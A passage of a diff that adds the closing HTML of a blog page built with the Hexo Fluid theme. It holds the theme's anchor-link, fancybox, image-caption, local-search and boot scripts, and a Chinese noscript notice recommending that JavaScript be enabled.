+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
